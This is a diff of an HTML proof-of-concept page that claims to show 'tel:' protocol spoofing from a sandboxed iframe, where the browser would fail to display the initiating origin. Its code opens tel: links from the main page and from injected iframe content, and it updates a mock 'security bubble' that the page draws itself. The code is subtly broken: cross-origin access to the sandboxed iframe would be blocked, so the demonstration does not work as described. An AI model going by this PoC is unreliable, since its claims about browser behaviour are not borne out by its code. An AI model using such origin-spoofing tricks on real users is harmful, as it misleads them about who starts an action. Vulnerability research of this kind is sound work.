@@ -3,39 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC - Tel Protocol Spoofing</title>
+    <title>PoC - Tel Protocol Spoofing in Sandboxed Iframe</title>
     <style>
-        body { font-family: Arial, sans-serif; }
+        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
         h1 { color: #2c3e50; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        .section { margin: 20px 0; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        button { padding: 12px 25px; font-size: 18px; margin: 10px; cursor: pointer; }
+        .iframe-container { margin-top: 20px; }
+        .bubble { margin-top: 20px; padding: 10px; border-radius: 5px; background-color: #ffeb3b; color: #333; font-size: 16px; }
+        .bubble-warning { background-color: #ff5722; color: white; }
     </style>
 </head>
 <body>
 
 <h1>Test for Tel Protocol Spoofing in Sandboxed Iframe</h1>
 
-<!-- Button to trigger 'tel:' protocol -->
-<button onclick="window.open('tel:1234567890')">ClickMe to trigger tel: protocol</button>
+<div class="section">
+    <h2>Step 1: Trigger 'tel:' Protocol (Main Page)</h2>
+    <button onclick="triggerTelProtocol('1234567890')">ClickMe to Trigger tel: Protocol</button>
+    <p>Click the button above to trigger a tel: protocol.</p>
+</div>
 
-<!-- Sandboxed iframe -->
-<iframe src="about:blank" sandbox="allow-scripts" id="sandboxedIframe" style="width: 100%; height: 200px; border: 1px solid #ccc;"></iframe>
+<div class="section iframe-container">
+    <h2>Step 2: Sandboxed Iframe Simulation</h2>
+    <iframe id="sandboxedIframe" src="about:blank" sandbox="allow-scripts" style="width: 100%; height: 300px; border: 1px solid #ccc;"></iframe>
+    <p>This iframe has a sandbox property, which will prevent it from showing the initiating origin in the security bubble.</p>
+</div>
+
+<div class="bubble" id="securityBubble">
+    <h3>Security Bubble (Expected Origin Info)</h3>
+    <p>This is where the initiating origin will be shown.</p>
+</div>
 
 <script>
-    // This script will dynamically load iframe content and simulate tel: protocol
+    // Function to trigger 'tel:' protocol from the main page
+    function triggerTelProtocol(number) {
+        // Open tel: protocol
+        window.open(`tel:${number}`);
+    }
+
+    // Dynamically inject content into the sandboxed iframe
     const iframe = document.getElementById('sandboxedIframe');
     
-    // Injecting HTML content into the iframe to simulate a different origin (for PoC purpose)
-    iframe.contentWindow.document.open();
-    iframe.contentWindow.document.write(`
-        <html>
-            <body>
-                <h2>Inside Sandbox</h2>
-                <p>This iframe is sandboxed with allow-scripts but is unable to display the correct initiating origin.</p>
-                <button onclick="parent.open('tel:9876543210')">ClickMe (Inside iframe) - Initiate tel: Protocol</button>
-            </body>
-        </html>
-    `);
-    iframe.contentWindow.document.close();
+    iframe.onload = function() {
+        const iframeDoc = iframe.contentWindow.document;
+        iframeDoc.open();
+        iframeDoc.write(`
+            <html>
+                <body>
+                    <h2>Inside Sandboxed Iframe</h2>
+                    <p>This iframe is sandboxed with "allow-scripts", so it cannot display the initiating origin in the security bubble.</p>
+                    <button onclick="parent.triggerTelProtocol('9876543210')">ClickMe (Inside iframe) - Initiate tel: Protocol</button>
+                </body>
+            </html>
+        `);
+        iframeDoc.close();
+    };
+
+    // Observe and simulate behavior for security bubble
+    function updateSecurityBubble(message, isWarning) {
+        const bubble = document.getElementById('securityBubble');
+        bubble.textContent = message;
+        if (isWarning) {
+            bubble.classList.add('bubble-warning');
+        } else {
+            bubble.classList.remove('bubble-warning');
+        }
+    }
+
+    // Listen to protocol events and simulate bubble display logic
+    window.addEventListener('beforeunload', function(event) {
+        updateSecurityBubble("Initiating origin bubble: [Unknown / Spoofed origin]", true);
+    });
+
+    // Testing different scenarios
+    document.querySelector("button").addEventListener('click', function() {
+        updateSecurityBubble("Initiating protocol via 'tel:'. Expecting 'parent' or correct origin bubble.", false);
+    });
 </script>
 
 </body>
